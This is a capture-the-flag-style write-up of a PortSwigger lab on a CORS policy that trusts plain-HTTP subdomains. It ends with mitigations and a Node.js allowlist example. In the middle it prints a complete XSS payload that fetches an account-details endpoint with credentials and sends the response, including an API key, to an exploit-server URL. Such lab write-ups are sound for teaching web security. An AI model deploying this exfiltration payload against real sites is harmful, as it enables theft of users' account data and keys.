# CORS Misconfiguration: Trusted Insecure Protocols

A CORS policy that trusts arbitrary subdomains and accepts `http://` origins can enable sensitive-data exfiltration (cookies, API keys) via cross-origin requests especially when combined with XSS or a network-level downgrade (MITM).

Background

- Many apps use multiple subdomains (e.g., `stock.example.com`, `api.example.com`) and want selective CORS between them.
- A common misconfiguration is reflecting `Origin` or allowing wildcard subdomains without enforcing HTTPS. When `Access-Control-Allow-Credentials: true` is present, a malicious script on an insecure origin can read authenticated responses.

Impact

- An attacker who can run JavaScript on a trusted origin (via XSS or injected content on an HTTP subdomain) can fetch and exfiltrate sensitive API responses.
- Even without XSS, accepting `http://` origins enables network-level attacks (MITM) to inject scripts and capture data.

Summary of my findings

- I found an application that accepted a trusted subdomain served over HTTP. The app made authenticated requests to an endpoint (`GET /accountDetails`) that returned sensitive user data when CORS allowed the origin with credentials.
- The `Check stock` feature on the HTTP subdomain was vulnerable to XSS. I hosted an exploit on the provided server and used it to exfiltrate account details and an API key.

Exploitation

1. I logged in as a normal user (wiener) and captured the authenticated request to `/accountDetails` in Burp Suite's history, which returned sensitive account data.
   
<img width="1349" height="718" alt="image" src="https://github.com/user-attachments/assets/b26f7411-088c-447b-8436-f3422429306b" />

<img width="1364" height="736" alt="image" src="https://github.com/user-attachments/assets/47dc1a39-ea68-44ae-87c4-cb4741a74281" />


2. To test CORS, I forwarded the request to Repeater and added an `Origin` header with a random host. The response didn't reflect my origin, indicating no wildcard or reflection. Testing with null origin also failed.
   
<img width="1363" height="729" alt="image" src="https://github.com/user-attachments/assets/2f6baf30-15ee-4665-9629-cbf31c5b81f4" />

<img width="1365" height="739" alt="image" src="https://github.com/user-attachments/assets/c9adbc98-dc30-4157-b040-39b25121e711" />


3. However, the site whitelisted a trusted subdomain served over plain HTTP.
   
<img width="1359" height="727" alt="image" src="https://github.com/user-attachments/assets/f04cf0a6-db6a-4d41-9492-520dfa358727" />

   
5. After exploring endpoints, I found the "Check stock" feature used HTTP and was vulnerable to XSS via the productId parameter, by intercepting the "Check stock" request on Burp Proxy, altering the parameter with an XSS script and fowarding it to the server.
   
<img width="1328" height="695" alt="image" src="https://github.com/user-attachments/assets/a8068b3d-95a2-4a2c-9c82-6a7502f64711" />

<img width="1131" height="581" alt="image" src="https://github.com/user-attachments/assets/2f823ac4-166b-427a-8cbf-76d7a95c0915" />

<img width="1366" height="725" alt="image" src="https://github.com/user-attachments/assets/dda10111-25a6-4f3f-afc5-6a3b37c1248a" />


5. I crafted an XSS payload that fetched `/accountDetails` with credentials and exfiltrated the data. 

The payload I used:

```
<html>
    <head>
        <h2>CORS-3</h2>
    </head>
    <body>
        <script>
           document.location="http://stock.0a8d005503020682823c835e00b20034.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();req.onload = reqListener; req.open('get','https://0a8d005503020682823c835e00b20034.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://exploit-0a560029031b065e826f825a015400fa.exploit-server.net/log?data='%2bthis.responseText; };;%3c/script>&storeId=1"
        </script>
    </body>
</html>

```
Hosting the payload on the exploit server and delivering it to the victim revealed the administrator's username, email, and API key within the access log panel, successfully completing the lab.

<img width="1237" height="656" alt="image" src="https://github.com/user-attachments/assets/6a7c67e6-483d-4289-b571-1eaaea8d0416" />

<img width="1298" height="695" alt="image" src="https://github.com/user-attachments/assets/b29eb5df-81f4-4d91-b724-2387a10d2d8e" />

<img width="1360" height="163" alt="image" src="https://github.com/user-attachments/assets/62f45933-b4d9-4a42-8c5c-420e079178c7" />

<img width="930" height="581" alt="image" src="https://github.com/user-attachments/assets/bbeba99a-04e9-4520-aac9-ab622fdc624c" />


What I've learn't

This lab highlighted the danger of protocol agnostic trust. Trusting *.example.com regardless of whether it uses HTTP or HTTPS is a common misconfiguration that allows for protocol downgradde attacks.

Mitigations

- Explicitly whitelist origins: do not reflect `Origin` or permit broad wildcards. Use a strict allowlist such as `Access-Control-Allow-Origin: https://stock.example.com`.

- Enforce HTTPS-only origins. Reject `http://` origins server-side.

- Avoid `Access-Control-Allow-Credentials: true` on public APIs; enable credentials only for specific trusted origins.

- Fix XSS across all subdomains; treat subdomains as first-class security boundaries.

- Validate `Origin` against a server-side whitelist rather than trusting client-supplied headers.

- Example (Node.js + cors middleware):

```js
const allowed = ['https://stock.example.com'];
app.use(cors({ origin: (origin, cb) => cb(null, allowed.includes(origin)), credentials: true }));
```

Tools used

- Burp Suite (Proxy, Repeater)
- PortSwigger exploit server (payload hosting)

References
- PortSwigger labs and documentation on CORS and XSS (https://portswigger.net/web-security/cors/lab-breaking-https-attack).

Happy (ethical) Hacking!
